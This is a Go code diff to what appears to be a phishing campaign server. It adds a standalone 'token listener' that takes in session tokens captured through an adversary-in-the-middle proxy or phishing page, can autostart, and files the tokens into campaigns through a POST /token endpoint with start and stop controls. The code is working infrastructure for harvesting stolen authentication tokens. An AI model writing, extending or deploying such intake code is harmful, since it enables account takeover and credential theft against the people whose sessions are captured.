@@ -366,6 +366,18 @@ func runServer() {
 	apiHandler := api.NewHandler(mgr, mailMgr, webhookLogPath, db)
 	apiHandler.SecureCookies = cfg.Server.SecureCookies
 
+	// Token listener — standalone intake server for out-of-band captured tokens
+	// (AiTM proxy / phishing page / manual drop). Controlled at runtime via
+	// /api/token-listener/{start,stop,status,logs}, or autostarted here.
+	tokenLogPath := filepath.Join(cfg.Storage.ArtifactsPath, "token_listener.log")
+	apiHandler.TokenListener = api.NewTokenListener(mgr, tokenLogPath, cfg.Listener.DefaultCampaign)
+	apiHandler.TokenListener.DefaultPort = cfg.Listener.TokenPort
+	if cfg.Listener.TokenAutostart {
+		if err := apiHandler.TokenListener.Start(cfg.Listener.TokenPort); err != nil {
+			log.Printf("[token-listener] autostart failed: %v", err)
+		}
+	}
+
 	// Main router
 	mux := http.NewServeMux()
 
@@ -433,6 +445,11 @@ func runServer() {
 		log.Printf("Allowlist  : console restricted to %s", strings.Join(cfg.Server.IPAllowlist, ", "))
 	}
 	log.Printf("Webhook    : POST %s://%s/receive  → %s", scheme, addr, webhookLogPath)
+	if cfg.Listener.TokenAutostart {
+		log.Printf("Token intake: POST http://%s:%d/token  → ingest into campaign (autostarted)", cfg.Server.Host, cfg.Listener.TokenPort)
+	} else {
+		log.Printf("Token intake: stopped — start with POST /api/token-listener/start (default port %d)", cfg.Listener.TokenPort)
+	}
 
 	srv := &http.Server{
 		Addr:              addr,
